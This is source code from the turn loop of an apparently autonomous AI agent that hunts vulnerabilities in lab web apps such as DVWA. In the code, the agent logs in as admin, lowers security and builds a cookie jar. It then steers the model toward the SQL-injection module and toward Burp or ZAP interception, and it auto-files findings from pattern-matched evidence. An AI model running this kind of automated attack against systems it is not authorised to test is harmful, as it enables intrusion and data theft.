  // the turn-end bookkeeping folds them into prevTurnDesktop, and
  // the next screen's nudge is computed from it. desktopLive
  // tracks whether the session-start snapshot found a real (CDP)
  // desktop: the per-turn heartbeat only runs while it is live, so
  // a headless fallback never pays a slow --dump-dom every turn.
  let turnKinds = [];
  let turnShellLogin = false;
  let prevTurnDesktop = { kinds: [], task: '', shellLogin: false };
  let desktopLive = false;
  let desktopNowLines = [];
  // INFINITY LEVEL: fold an executed action's structured snapshot
  // into the session page state (and persist it). A refusal carries
  // no snapshot, so it changes nothing.
  const noteSnapshot = (res) => {
    if (res && res.snapshot) {
      try {
        sessionPageState = mergePageState(sessionPageState, res.snapshot);
        savePageState(huntId, sessionPageState);
      } catch { /* page-state persistence is best-effort */ }
    }
  };
  let lastShellAt = 0;
  let lastShellCommand = '';
  let aiOk = false;
  let turnsRun = 0;
  // Lane I continuity state: the previous session's hand-off renders
  // on every screen of this session; this session's own trail feeds
  // the journal on screen and the leftOff persisted at session end.
  // Lane O: the hand-off comes through the memory read path — when
  // the persisted leftOff is missing (legacy meta, a crash before
  // the first clean session end, a lost write), loadHuntMemory
  // derives one from the permanent record, so a hunt with history
  // never starts cold.
  let memory0 = null;
  try { memory0 = loadHuntMemory(huntId, { target, meta: meta0 }); } catch { /* memory is best-effort */ }
  const prevLeftOff = leftOffLines((memory0 && memory0.leftOff) || (meta0.humanLoop && meta0.humanLoop.leftOff));
  // WRONG-PAGE GUARD (fix 2): seed the session's last observation
  // from the previous session's last action result instead of
  // starting blind (''). The auth gate's empty-snapshot check trips
  // on '' at the first GUI action of EVERY session otherwise.
  lastObservation = lastActionResultOfLeftOff((memory0 && memory0.leftOff) || (meta0.humanLoop && meta0.humanLoop.leftOff));
  let sessionLastThinking = '';
  let sessionLastNote = '';
  // KEYWORD-INDEX: the task block of this session. sessionTaskSeen
  // marks that a block arrived at all, so the checkpoints can clear
  // a stale currentTask (null) instead of leaving it standing.
  let sessionCurrentTask = null;
  let sessionLastCompletedTask = null;
  let sessionTaskSeen = false;
  // STUCK-DETECTOR (1 Nov 2026, v2): counts consecutive recall actions
  // across sessions (persistent file). If the brain recalls 5+ times in a
  // row without filing, it's stuck in a proof-bottling loop -- inject
  // a FILE NOW directive. Session-local vars reset on restart, so we
  // use a file in the hunt dir.
  const stuckCounterPath = path.join(huntDir(huntId), 'stuck_recall_count.txt');
  function getStuckCount() {
    try { return parseInt(fs.readFileSync(stuckCounterPath, 'utf8').trim(), 10) || 0; }
    catch { return 0; }
  }
  function setStuckCount(n) {
    // Writer: ensure the hunt dir first (huntDir() is a pure path
    // builder since the h_nope fix and never mkdirs — a read-only
    // getStuckCount must never create the dir, but this write may).
    try { ensureHuntDir(huntId); fs.writeFileSync(stuckCounterPath, String(n)); } catch {}
  }

  say(`Human mode session: ${turns} turns at my own machine. Target: ${target}.`);

  // WRONG-PAGE GUARD (fix 5): deterministic turn-start snapshot —
  // the driver looks at the live page itself and seeds
  // lastObservation with what it actually sees, so the session
  // never starts blind. This is perception (like the per-turn
  // machine-state read), not a brain action: no tool_call event.
  // The brain never snapshots on its own (0 in 140 turns), so the
  // loop does it. Read-only, so it runs even while the owner holds
  // control. On a foreign page the driver refuses with the WRONG
  // PAGE observation, which is itself the seed — it names the page
  // and the way back.
  try {
    const startSnap = await getGui().snapshot(huntId);
    if (startSnap && startSnap.observation) {
      lastObservation = startSnap.observation;
      notePageUrl(lastObservation);
      noteSnapshot(startSnap);
      // VISIBLE-DESKTOP-FIRST: the per-turn heartbeat only runs
      // while a REAL (CDP) desktop is live — a degraded (headless
      // look-only) snapshot means the desktop is down, and a
      // heartbeat would pay a slow --dump-dom every turn for it.
      desktopLive = startSnap.degraded !== true;
    }
  } catch { /* best-effort: a failed snapshot leaves the seed */ }

  // LOGIN-FIRST (zero-genuine lane): on a known lab app the hunt
  // starts behind its login wall — every real module sits behind
  // auth. Log in once per session (default lab credentials via the
  // vault), set security low, verify the session, and record it
  // before the first brain turn. A failed login is a recorded
  // auth_block blocker, never a silent skip. Best-effort: a failed
  // login never breaks the session — the brain is told on its first
  // screen and hunts unauthenticated.
  try {
    const login = await runLabLoginFirst(huntId, target, {
      gui: getGui(),
      saveCredential,
      getCredential,
      readMeta: deps.readMeta,
      writeMeta: deps.writeMeta,
      record: deps.record,
      note,
      addSecret: (s) => sessionSecrets.add(s),
      say,
      // OCR fallback (27 Oct 2026, live 22:50 failure): when a
      // label click misses — the OCR map reads "Username" as
      // "u ername" — the login falls back to the screen map's
      // coordinates. The map reader + the coordinate clicker are
      // injected here so labLogin stays testable without a desktop.
      screenMap: async () => {
        try {
          const res = await captureScreenMap(huntId, deps);
          if (!res || !res.ok) return { ok: false, error: (res && res.error) || 'map unavailable' };
          return { ok: true, lines: parseScreenMapLines(res.map) };
        } catch (err) {
          return { ok: false, error: String((err && err.message) || err) };
        }
      },
      clickAt: async (x, y) => {
        try {
          const res = await deps.execRaw(huntId, desktopClickAtCommand(x, y), 15000, { bypassTmux: true });
          return { ok: String((res && res.stdout) || '').includes('clicked') };
        } catch {
          return { ok: false };
        }
      },
    });
    if (login && !login.ok && login.reason && login.reason !== 'not-needed') {
      say(`Login-first blocked: ${login.reason} — hunting continues unauthenticated. The visible browser is still logged out — a shell curl login does NOT log it in; log in in the browser so the owner sees the authenticated surface.`);
    }
  } catch { /* login-first is best-effort */ }

  // POST-DISPATCH FILER SWEEP (#316): the pre-dispatch auto-filer scan
  // only sees text from BEFORE dispatch, so evidence produced during
  // dispatch (OCR screen text appended after screenshot/proof actions,
  // tool outputs) waits a full turn — and is lost entirely if the
  // session ends. This sweep runs at the end of every turn over the
  // final observation and files through the same claimGateCheck +
  // verifier as a claim_finding action. Dedup: a per-session set plus
  // isDuplicate (the sweep's own filing record satisfies later turns'
  // checks).
  const sweepFiledTitles = new Set();
  async function sweepPostDispatchEvidence(text) {
    let detected = null;
    try { detected = detectEvidence(String(text || '')); } catch { return; }
    if (!detected) return;
    if (sweepFiledTitles.has(detected.title)) return;
    try {
      if (isDuplicate(huntDir(huntId), detected.title)) return;
    } catch { /* dup check is best-effort; fail-open to filing */ }
    const rawTitle = String(detected.title || '');
    const title = String(rawTitle.trim() ? rawTitle : 'Untitled claim').slice(0, 200);
    const evidence = String(detected.evidence || '');
    const command = String(detected.command || lastShellCommand || '');
    const gate = claimGateCheck({
      title: rawTitle,
      cls: normaliseCoverageClass(detected.class) || claimClassFromTitle(rawTitle),
      command,
      poc: '',
      pocExists: false,
      evidence,
      counterevidence: detected.counterevidence,
      confidence: detected.confidence,
      rationale: 'Auto-detected by pattern matcher from brain output; brain has not manually filed this claim',
    });
    if (!gate.ok) {
      try { deps.record(huntId, { type: 'postdispatch_sweep_bounce', tool: 'claim_finding', detail: title, missing: gate.missing.map((m) => m.field), via: 'human-mode' }); } catch {}
      return;
    }
    const assess = await getAssess();
    if (!assess) return;
    let rec = null;
    try {
      rec = await assess(huntId, target, {
        test: title,
        command,
        why: 'Human-mode post-dispatch sweep — evidence produced during dispatch, filed same turn.',
        hypothesis: title,
      }, { stdout: evidence, stderr: '', code: 0 });
    } catch { return; }
    if (rec && rec.verified) {
      newFindings.push(rec);
      if (Array.isArray(opts.findings)) opts.findings.push(rec);
      sweepFiledTitles.add(detected.title);
      // Written with the action literal so later turns' isDuplicate
      // checks (pre-dispatch scan) recognise this filing.
      try { deps.record(huntId, { type: 'autofiler_postdispatch_filed', action: 'claim_finding', title, class: detected.class, via: 'human-mode' }); } catch {}
    }
  }

  for (let turn = 1; turn <= turns; turn++) {
    // Operator control: a pause/stop landed mid-session — hold position.
    try {
      const m = deps.readMeta(huntId) || {};
      if (m.paused === true || m.stopped === true || m.state === 'paused' || m.state === 'stopped') {
        say('Hunt paused/stopped by the operator — holding position.');
        break;
      }
    } catch { /* meta check is best-effort */ }

    // VISIBLE-DESKTOP-FIRST: fresh routing record for this turn —
    // toolCall appends the kinds this turn executes; the turn-end
    // bookkeeping folds them into prevTurnDesktop for the next
    // screen's nudge.
    turnKinds = [];
    turnShellLogin = false;

    // PER-TURN MEMORY REFRESH (Lane I): the briefing was built ONCE
    // per session and frozen for all 6 turns, so the brain's own
    // notes and actions from earlier turns of THIS session never
    // entered its memory until the next session. Rebuild it every
    // turn (the session-start call above is turn 1's). Best-effort:
    // a failed refresh keeps the previous briefing, never the turn.
    if (turn > 1) {
      try {
        const fresh = await deps.buildBriefing(huntId, target, deps.readMeta(huntId) || meta0);
        if (typeof fresh === 'string' && fresh.length > 0) briefing = fresh;
      } catch { /* keep the previous briefing */ }
    }

    // PERCEIVE: live machine state (working directory + workspace).
    let machineState = '';
    try {
      const st = await deps.execRaw(huntId, 'pwd; echo ---; ls -1 | head -40', 15000, { bypassTmux: true });
      machineState = `${st.stdout || ''}${st.stderr || ''}`.trim().slice(0, 900) || '(empty)';
    } catch {
      machineState = '(machine state unavailable)';
    }

    // VISIBLE-DESKTOP-FIRST: per-turn desktop heartbeat — every
    // turn starts with a fresh screen read, so the brain acts
    // against what is actually on screen, not from memory. The
    // browser snapshot is the fast CDP read (the same one the
    // session start takes). Best-effort and gated on desktopLive:
    // when the desktop is down the snapshot degrades to a slow
    // headless --dump-dom, and the heartbeat would stall every
    // turn for it. A failed heartbeat clears desktopLive, so it is
    // paid at most once. This is perception, not a brain action:
    // no tool_call event, and lastObservation (the result of the
    // last ACTION) is never overwritten by it. It reads the
    // BROWSER only — the window list is the desktop_snapshot
    // action's job: a heartbeat windows read would consume the
    // down-signal the desktop_terminal branch uses to start a
    // cold desktop, and would look like terminal work to the
    // desktop-call counters. The whole desktop is still read by
    // the brain's own see_screen / desktop_snapshot, which the
    // DESKTOP-FIRST rule and the nudge push it to take.
    desktopNowLines = [];
    if (desktopLive) {
      try {
        const hb = await getGui().snapshot(huntId);
        if (hb && hb.observation) {
          if (hb.degraded === true) { desktopLive = false; }
          else {
            desktopNowLines = heartbeatBlock(hb.observation);
            notePageUrl(hb.observation);
            noteSnapshot(hb);
          }
        } else { desktopLive = false; }
      } catch { desktopLive = false; }
    }

    const evFindings = findingsFromEvents(deps, huntId);
    const seenTitles = new Set(evFindings.map((f) => f.title));
    const findingsNow = [...evFindings, ...newFindings.filter((f) => !seenTitles.has(f.title))];
    let retractedCount = 0;
    try {
      retractedCount = retractedFindingCount(deps.readEvents(huntId) || []);
    } catch { /* retraction note is best-effort */ }
    // Lane J: concrete unprobed leads, refreshed every turn from the
    // hunt's current record (same per-turn discipline as the Lane I
    // briefing refresh) — as probes land, leads drop off the screen.
    let leads = [];
    try {
      const leadEvents = deps.readEvents(huntId) || sessionEvents;
      let leadRows = [];
      try {
        leadRows = getAllReasoning(huntId) || [];
      } catch { /* reasoning rows are best-effort */ }
      leads = unprobedLeadLines({ events: leadEvents, reasoningRows: leadRows, target });
    } catch { /* leads are best-effort perception */ }
    // Lane L: merge the hunt's coverage ledger into the same
    // region — rows the brain recorded take precedence over the
    // computed lead for their (surface, class) key, and open gaps
    // + cumulative research debt render alongside what remains.
    let coverageLines = [];
    try {
      const covData = loadCoverage(huntId);
      const merged = mergeLeadsWithCoverage({ leads, rows: covData.rows, debt: covData.researchDebt, target });
      leads = merged.leads;
      coverageLines = merged.coverage;
    } catch { /* coverage is best-effort perception */ }
    // Lane O: the state-of-mind block, refreshed every turn from
    // the permanent record (the same per-turn discipline as the
    // Lane I briefing refresh) — as probes land and rows close,
    // the done / not-done picture moves with the hunt.
    let stateOfMind = [];
    try {
      stateOfMind = computeStateOfMind(deps.readMeta(huntId) || meta0) || [];
    } catch { /* state of mind is best-effort perception */ }
    // Lane T: the failed-action follow-through thread, refreshed
    // every turn from the hunt's current record (the same discipline
    // as the leads refresh above) — the live loss happened between
    // two turns of ONE session, so this is never a session-start
    // computation.
    let followThrough = [];
    try {
      const ftEvents = deps.readEvents(huntId) || sessionEvents;
      let ftRows = [];
      try {
        ftRows = getAllReasoning(huntId) || [];
      } catch { /* reasoning rows are best-effort */ }
      followThrough = failedActionThreadLines({ events: ftEvents, reasoningRows: ftRows });
    } catch { /* follow-through is best-effort perception */ }
    // Lane AD: the settled-actions block, refreshed every turn
    // from the hunt's current record (the same discipline as the
    // Lane T thread above) — block counts grow mid-session as the
    // gate fires, and a signature settles the turn its third
    // block lands. Block counts come from the recorded dedup_block
    // events; run counts from the live action history.
    let settled = [];
    // Lane AG: this turn's events snapshot, kept for the gate
    // block path below. It is a COPY: the gate records the
    // current block into the same store mid-turn, and that block
    // must not leak into its own evidence count — the block path
    // adds it explicitly (extraBlocks) so the ordinal is exact.
    let turnEvents = sessionEvents;
    try {
      const sEvents = deps.readEvents(huntId) || sessionEvents;
      turnEvents = Array.isArray(sEvents) ? sEvents.slice() : sEvents;
      settled = settledActionLines({ events: sEvents, history: actionHistory });
    } catch { /* settled is best-effort perception */ }
    // INFINITY LEVEL: the exhausted-surface record + the parsed
    // page state + the loop counters, refreshed every turn from
    // the hunt's current record (same discipline as Lane AD).
    // surfaceCounts feeds the gate below; the page-state lines
    // and counters ride the screen; the credential state names
    // the account route in the auth-wall block.
    let surfaceCounts = new Map();
    let exhaustedLines = [];
    let pageStateLinesOut = [];
    let desktopStateLinesOut = [];
    let chatQuestionLinesOut = [];
    let planLinesOut = [];
    let detailsRequestLinesOut = [];
    let pendingChat = [];
    let credentialState = { saved: false };
    try {
      let turnRows = [];
      try { turnRows = getAllReasoning(huntId) || []; } catch { /* rows are best-effort */ }
      surfaceCounts = surfaceBlockCounts({ events: turnEvents, reasoningRows: turnRows });
      credentialState = credentialStateFor({ events: turnEvents, target });
      exhaustedLines = exhaustedSurfaceLines({ counts: surfaceCounts, target, credential: credentialState, events: turnEvents });
      const counters = loopCounters({ events: turnEvents, reasoningRows: turnRows, pageState: sessionPageState });
      pageStateLinesOut = [...pageStateLines(sessionPageState, { target }), ...loopCounterLines(counters)];
      // WHOLE-OS CONTROL: the desktop state rides the same
      // per-turn refresh as the page state.
      // REAL-HUMAN: the desktop nudge — when a browser surface is
      // exhausted AND the desktop has never been used in this hunt,
      // the screen names the desktop route explicitly. It is a
      // gate/observation naming an untried surface (the exhausted
      // pattern), never a chosen action: the brain still decides
      // what to do, but it can no longer claim it did not see the
      // desktop. Once any desktop action lands, the nudge leaves
      // the screen on its own.
      const desktopUsed = (counters.desktopClicks || 0) + (counters.desktopKeys || 0) + (counters.desktopClickControls || 0) + (counters.seeScreens || 0) + (counters.desktopClickAts || 0) + (counters.desktopTerminals || 0) > 0;
      const routeNudge = (exhaustedLines.length > 0 && !desktopUsed)
        ? 'DESKTOP ROUTE OPEN — your browser route on an exhausted surface is closed, and the desktop is still untried in this hunt: take desktop_snapshot, launch Burp or ZAP from the shell, and work the login flow there (proxy_start intercepts it; desktop_click_control presses a named button inside the app). A GUI tool sees what the browser loop cannot.'
        : '';
      // VISIBLE-DESKTOP-FIRST: the shell-only nudge — when the
      // previous turn did interactive work via shell only (or
      // logged in via curl), the screen says so and names the
      // desktop route. Both nudges ride the same line; either is
      // a nudge, never a forced action choice.
      const shellNudge = desktopFirstNudge(prevTurnDesktop);
      const desktopNudge = [routeNudge, shellNudge].filter(Boolean).join(' ');
      desktopStateLinesOut = desktopStateLines(sessionDesktopState, { target, nudge: desktopNudge });
      // REAL-HUMAN: the owner's queued questions, refreshed every
      // turn from the queue file (same discipline as the leads) —
      // a question asked mid-turn is on the very next screen.
      try {
        pendingChat = pendingChatQuestions(huntId) || [];
        chatQuestionLinesOut = chatQuestionScreenLines(pendingChat, { nowMs: deps.now() });
      } catch { /* a broken queue file never breaks the turn */ }
      // HUNTER-MIND: the brain's own plan, refreshed every turn
      // from the plan file (same discipline as the leads) — the
      // plan is the hunter's own instructions, and the screen
      // shows what is done, what is next, and whether the last 3
      // turns were all blocked (a stuck hunter revises its plan).
      try {
        planLinesOut = huntPlanLines(sessionPlan, { stuck: planStuck(log), outputsSaved: outputCount(sessionOutputs) });
      } catch { /* a broken plan file never breaks the turn */ }
      // DYNAMIC DETAILS (27 Oct 2026): the owner's details requests,
      // refreshed every turn from the user-details store (same
      // discipline as the queued questions) — a pending request says
      // WAIT, a newly-filled request's values ride the screen for
      // exactly one turn, a recent decline says so once.
      try {
        detailsRequestLinesOut = detailsRequestScreenLines(huntId, sessionSecrets);
      } catch { /* a broken details store never breaks the turn */ }
    } catch { /* exhausted/page-state/counters are best-effort perception */ }
    const screen = buildScreen({
      target,
      parsedScope,
      briefing,
      findings: opts.findings && opts.findings.length ? opts.findings : findingsNow,
      machineState,
      lastObservation,
      turn,
      turns,
      scopeHosts,
      facts,
      repetition,
      explored: exploredDigestLines(actionHistory),
      leftOff: prevLeftOff,
      journal: sessionJournalLines(log),
      retractedCount,
      leads,
      coverage: coverageLines,
      skills: skillLines,
      stateOfMind,
      followThrough,
      settled,
      pageState: pageStateLinesOut,
      exhausted: exhaustedLines,
      desktopState: desktopStateLinesOut,
      desktopNow: desktopNowLines,
      chatQuestions: chatQuestionLinesOut,
      huntPlan: planLinesOut,
      detailsRequest: detailsRequestLinesOut,
    });

    // THINK: one brain call. Full reply is recorded verbatim (total
    // permanent memory) BEFORE parsing — the thought is the record,
    // the JSON is just its last line.
    let reply = null;
    try {
      reply = await deps.chat([{ role: 'user', text: screen }], system, { huntId });
    } catch {
      reply = null;
    }
    // FIX (#362): an empty reply must not consume a turn or end the
    // hunt. Previously turnsRun++ ran BEFORE this check and the loop
    // broke (or returned no_reply at once), so one transient empty
    // response cost a turn and stopped the session. Now the empty
    // turn is skipped (continue) without counting, and the loop
    // retries with a fresh screen; the for loop's turn budget still
    // bounds total attempts, and a persistently silent brain ends
    // the run via the driver's fail-streak mechanism (the final
    // return below still reports failKind 'no_reply' when no reply
    // ever arrived, preserving LOOP-7's signal).
    if (!reply || !String(reply).trim()) {
      say('Brain gave no reply this turn.');
      continue;
    }
    turnsRun++;
    aiOk = true;
    const replyText = String(reply);
    // Lane AI: parse BEFORE recording the reply. Total permanent
    // memory still holds the whole reply — except a secret it
    // carries: a save_credential password joins the session secret
    // set first, so the recorded thinking text is scrubbed of it
    // and the secret lives only in the vault. Anything else stays
    // verbatim.
    const parsed = parseHumanAction(replyText);
    if (parsed && String(parsed.action.action).toLowerCase() === 'save_credential' && parsed.action.password) {
      sessionSecrets.add(String(parsed.action.password));
    }
    try { deps.record(huntId, { type: 'thinking', text: scrub(replyText), via: 'human-mode', turn }); } catch { /* best-effort */ }

    // KEYWORD-INDEX: the task block beside the action is the hunt's
    // current state — recorded, never re-derived. A complete task
    // saves its input/output to disk NOW (task_complete event) and
    // becomes lastCompletedTask; an in-progress task becomes
    // currentTask, so the next screen resumes it instead of
    // starting fresh.
    if (parsed && parsed.task) {
      sessionTaskSeen = true;
      const tb = parsed.task;
      if (tb.status === 'complete') {
        try { deps.record(huntId, { type: 'task_complete', task: tb.task || '', goal: tb.goal || '', progress: tb.progress || '', summary: tb.summary || '', via: 'human-mode' }); } catch { /* best-effort */ }
        sessionLastCompletedTask = { ...tb, completedAt: new Date().toISOString() };
        sessionCurrentTask = null;
      } else {
        sessionCurrentTask = { ...tb, status: 'in_progress', updatedAt: new Date().toISOString() };
      }
    }

    if (!parsed) {
      sessionLastThinking = replyText.trim().slice(0, 400);
      lastObservation =
        'Your reply had NO parseable action JSON, so nothing happened. Reply with brief thinking, then end with EXACTLY ONE action as a JSON object on the last line — e.g. {"action":"shell","command":"curl -s ' + String(target).slice(0, 60) + '"}';
      note({ action: 'unparseable reply', why: replyText.slice(0, 300), result: 'no action executed', learned: 'Replies must end with exactly one action JSON.' });
      log.push({ turn, action: 'unparseable', detail: '', observation: lastObservation });
      continue;
    }
    let action = parsed.action;
    const thinkingText = replyText.slice(0, parsed.jsonStart).trim().slice(0, 400);
    sessionLastThinking = thinkingText;
    let kind = String(action.action).toLowerCase();
    let observation = '';
    let recallLoopProof = null;

    // STUCK-DETECTOR v2: persistent across sessions
    if (kind === 'recall') {
      const c = getStuckCount() + 1;
      setStuckCount(c);
      if (c >= 5) {
        observation = 'STOP RECALLING. You have repeated recall ' + c + ' times across sessions. If you already have evidence on screen for a finding on ' + String(target).slice(0, 80) + ', FILE THE CLAIM NOW using {"action":"claim_finding","title":"<the finding you actually observed>","class":"<its class>","evidence":"<what you actually observed>","command":"<your replay command>","counterevidence":"<what normal behavior shows>","confidence":"high"}. Do NOT invent evidence you did not see. If you have NO finding evidence, say so and move to a new test instead of recalling. FILE what you saw, or MOVE ON. Do NOT recall again.';
        try { deps.record(huntId, { type: 'stuck_detector_triggered', count: c, via: 'human-mode' }); } catch {}
        setStuckCount(0);
      }
    } else if (kind === 'claim_finding') {
      setStuckCount(0);
    } else if (!['shell', 'browser_snapshot', 'screenshot', 'browser_type', 'browser_click'].includes(kind)) {
      setStuckCount(0);
    }

    // AUTO-FILER v1: Scan brain output for vulnerability evidence.
    // If strong evidence found (SQLi hashes, XSS, CMDI), auto-file the claim.
    // The brain hunts; the filer files. Together they are the complete human.
    // Rehydrate the loop-breaker proof from the append-only event log on
    // every turn, so the next-turn auto-filer retains the original command
    // and recovered evidence instead of falling back to a placeholder PoC.
    if (!recallLoopProof) {
      try { recallLoopProof = recoverRecallLoopSqli(deps.readEvents(huntId) || []); } catch { /* best-effort */ }
    }
    try {
      // The previous action's result is also first-party text evidence.
      // This matters for recall: its handler runs after this turn's initial
      // scan, so a recovered proof is filed on the next turn.
      const scanText = String(thinkingText || '') + '\n' + String(observation || '') + '\n' + String(lastObservation || '');
      const detected = detectEvidence(scanText);
      // PG-1 (6 Nov 2026, permanent system-level fix): the scan text
      // carries the PREVIOUS turn's probe output, so the filer can fire
      // on evidence of a claim the brain is still proving. When the
      // brain's own action is a probe of the SAME payload class, the
      // probe must run — the proof gate owns the filing decision for
      // that claim (it counts re-proofs to PROOF_THRESHOLD, then
      // nudges/files). Overriding here eats the probe turn, starves
      // the count, and lets the claim reach the verifier with one
      // proof instead of three. The filer still fires when the brain
      // is doing anything else (recall, search, browser_open, or a
      // probe of a DIFFERENT class) — cross-class evidence is never
      // suppressed. proofSignatureFor is pure; currentPageUrl is the
      // live page, the same page the proof-gate check below uses.
      const probeSigForDetected = detected
        ? proofSignatureFor(kind, action, { page: currentPageUrl })
        : null;
      const sameClassProbe = !!(probeSigForDetected && probeSigForDetected.payloadClass === detected.class);
      if (sameClassProbe) {
        try { deps.record(huntId, { type: 'autofiler_probe_skipped', title: detected.title, class: detected.class, tool: kind, detail: probeSigForDetected.key, via: 'human-mode' }); } catch {}
      } else if (detected && isDuplicate(huntDir(huntId), detected.title)) {
        // FIX (#315): the scan text includes lastObservation (previous
        // turn), so without this check the same evidence re-triggers an
        // override every turn. Skip the override; the brain's own action
        // stands. (Path comes from store.js huntDir() so it follows
        // DATA_DIR — the hardcoded /opt/Dark-Matter hunt prefix is gone.)
        try { deps.record(huntId, { type: 'autofiler_duplicate_skipped', title: detected.title, class: detected.class, via: 'human-mode' }); } catch {}
      } else if (detected) {
        // Construct the claim_finding action
        const autoClaim = {
          action: 'claim_finding',
          title: detected.title,
          class: detected.class,
          evidence: detected.class === 'sqli' && recallLoopProof
            ? recallLoopProof.evidence
            : detected.evidence,
          // FIX (#359): the detector returns command: '' (it cannot
          // ground a replay — see autoFiler.js), so fall back to the
          // real shell command that produced this evidence, mirroring
          // the post-dispatch sweep. Without a real command the claim
          // gate bounces the claim instead of filing a lab replay.
          command: detected.class === 'sqli' && recallLoopProof
            ? recallLoopProof.command
            : (detected.command || lastShellCommand || ''),
          counterevidence: detected.counterevidence,
          confidence: detected.confidence,
          confidence_rationale: 'Auto-detected by pattern matcher from brain output; brain has not manually filed this claim',
        };
        // Log the auto-filing
        try { deps.record(huntId, { type: 'autofiler_triggered', title: detected.title, class: detected.class, via: 'human-mode' }); } catch {}
        // Override the brain's action with our auto-filed claim
        // (The brain's original action is preserved in the log)
        action = autoClaim;
        // FIX: recompute kind after override, else dispatch uses stale kind
        kind = 'claim_finding';
        observation = 'AUTO-FILER: Strong ' + detected.class.toUpperCase() + ' evidence detected in your output. ' +
                      'Filing claim automatically: "' + detected.title + '". ' +
                      'This is what a human hunter does — files the report when proof is found.';
      }
    } catch (afErr) {
      // Auto-filer must never break the hunt loop
      try { deps.record(huntId, { type: 'autofiler_error', error: String(afErr).slice(0, 200), via: 'human-mode' }); } catch {}
    }

    // STUCK-DETECTOR v3: if the brain itself says it's stuck looping,
    // inject FILE NOW immediately (don't wait for 5 recalls)
    const thinkingLower = String(thinkingText || '').toLowerCase();
    const isStuckTalk = thinkingLower.includes('stuck looping') ||
      thinkingLower.includes('stuck in a loop') ||
      thinkingLower.includes('stuck in that') ||
      (thinkingLower.includes('stuck') && thinkingLower.includes('login loop')) ||
      thinkingLower.includes('breaking out') ||
      thinkingLower.includes('break this login loop');
    if (isStuckTalk) {
      observation = 'YOU SAID YOU ARE STUCK LOOPING. STOP. If you have observed evidence for a finding on ' + String(target).slice(0, 80) + ', FILE THE CLAIM NOW with ONLY the evidence you actually saw: {"action":"claim_finding","title":"<the finding you observed>","class":"<its class>","evidence":"<what you observed>","command":"<your replay command>","counterevidence":"<what normal behavior shows>","confidence":"high"}. Do NOT file a claim about anything you did not observe. If you have NO finding evidence, stop this line of testing and try a different approach. FILE what you saw, or MOVE ON — DO NOT RECALL.';
      try { deps.record(huntId, { type: 'stuck_detector_v3_triggered', via: 'human-mode' }); } catch {}
    }

    // DVWA AUTO-LOGIN: if brain is stuck at DVWA login page (CSRF token issue),
    // perform system-level login via shell. Permanent fix - brain never has to
    // fight the login form again.
    try {
      // If brain says stuck and target is DVWA, auto-login immediately.
      // (isStuckAtDvwaLogin gate removed - was too strict, blocked the fix)
      {
        const dvwaTarget = (typeof target === 'string' ? target : '');
        if (/3100|dvwa/i.test(dvwaTarget)) {
          const loginRes = await dvwaLogin({
            huntId,
            target: dvwaTarget,
            execInContainer: async (hid, cmd) => {
              // Use the container exec via deps
              if (deps.execInContainer) return await deps.execInContainer(hid, cmd);
              if (deps.execRaw) return await deps.execRaw(hid, cmd);
              throw new Error('no_container_exec');
            },
          });
          if (loginRes.ok) {
            // Write cookies to container for brain's shell use
            try {
              const { getDvwaCookies } = await import('./dvwaAuth.js');
              const cookies = getDvwaCookies(huntId);
              if (cookies && deps.execRaw) {
                const cookieFile = `/tmp/dvwa-cookies-${huntId}.txt`;
                const lines = ['# Netscape HTTP Cookie File'];
                for (const c of cookies.split(';')) {
                  const idx = c.indexOf('=');
                  if (idx > 0) {
                    const k = c.slice(0, idx).trim();
                    const v = c.slice(idx + 1).trim();
                    if (k) lines.push(`172.17.0.1\tFALSE\t/\tFALSE\t0\t${k}\t${v}`);
                  }
                }
                await deps.execRaw(huntId, `cat > ${cookieFile} << 'COOKIEEOF'\n${lines.join('\n')}\nCOOKIEEOF`);
              }
            } catch {}
            observation = 'SYSTEM AUTO-LOGIN: Successfully logged into DVWA as admin (security set to low). ' +
              'STOP trying to log in via the browser - you are ALREADY authenticated via the backend. ' +
              'Your browser does NOT have the session cookies. To hunt, use SHELL with the cookie jar at ' +
              `/tmp/dvwa-cookies-${huntId}.txt. Example: curl -s -b /tmp/dvwa-cookies-${huntId}.txt ` +
              '"http://172.17.0.1:3100/vulnerabilities/sqli/?id=1&Submit=Submit". ' +
              'The SQL Injection module is at /vulnerabilities/sqli/. Hunt it NOW via shell - do NOT use the browser login form.';
            try { deps.record(huntId, { type: 'dvwa_autologin', ok: true, via: 'human-mode' }); } catch {}
          } else {
            try { deps.record(huntId, { type: 'dvwa_autologin', ok: false, error: loginRes.error, via: 'human-mode' }); } catch {}
          }
        }
      }
    } catch (dvwaErr) {
      // Auto-login must never break the hunt loop
      try { deps.record(huntId, { type: 'dvwa_autologin_error', error: String(dvwaErr).slice(0, 200), via: 'human-mode' }); } catch {}
    }

    // REAL-HUMAN: the brain's answers to the owner's queued
    // questions ride in the SAME reply as its action (the
    // chat_answers array on the action JSON). They are delivered
    // FIRST, before the action is gated or executed — the answer
    // is independent of what the action does, and a gate-blocked
    // action must never swallow the owner's answer with it.
    // Delivery is the dep (tests inject a stub); the pending list
    // is the turn's own snapshot, so an answer to a question asked
    // after this screen was built is ignored, never invented.
    try {
      const answers = extractChatAnswers(action, pendingChat);
      for (const a of answers) {
        try {
          await deps.deliverChatAnswer(huntId, a);
        } catch { /* one failed delivery never blocks the rest */ }
        try {
          note({ action: `chat_answer: ${a.q}`, why: thinkingText, result: String(a.answer || '').slice(0, 300), learned: '' });
        } catch { /* the reasoning note is best-effort */ }
      }
    } catch { /* chat answers are best-effort — the action still runs */ }

    // ACT
    // ALREADY-DONE GATE (Lane F): the identical action has already
    // been executed >= 2 times in this hunt — do not execute it
    // again. The block is recorded as a dedup_block event (visible
    // in events.jsonl, countable by monitors) and the brain gets an
    // observation carrying the count and, when known, the last
    // result — then it must choose a different action. Every other
    // gate below runs exactly as before for actions that pass.
    // WRONG-PAGE GUARD (fix 4): the narrow return-to-target
    // exemption — a browser_open of the target's own login surface
    // while the live tab is provably OFF the target is not a repeat,
    // it is the way home (Trap 4: every such open already ran x2,
    // so dedupe blocked the return forever). Unknown current page
    // means NO exemption; repeated opens while already ON the
    // target are still deduped as before.
    const returnExempt = isReturnToTarget(kind, action, currentPageUrl, target, parsedScope);
    // FRESH ATTEMPT (dedup-submit lane): the gate reads the same
    // per-turn event record the auth gate reads, so in-session GUI
    // work counts too — a snapshot / new marker / reload since the
    // last identical execution makes the repeat a fresh attempt.
    const gateHit = returnExempt ? null : dedupeGateHit(kind, action, actionHistory, { events: turnEvents });
    // REAL-HUMAN: the near-duplicate search gate — same question in
    // different words. Judged only when the exact gate did not
    // already fire (an exact repeat is the stronger statement).
    const searchHit = !gateHit && kind === 'search' ? searchRepeatHit(action.query, actionHistory) : null;
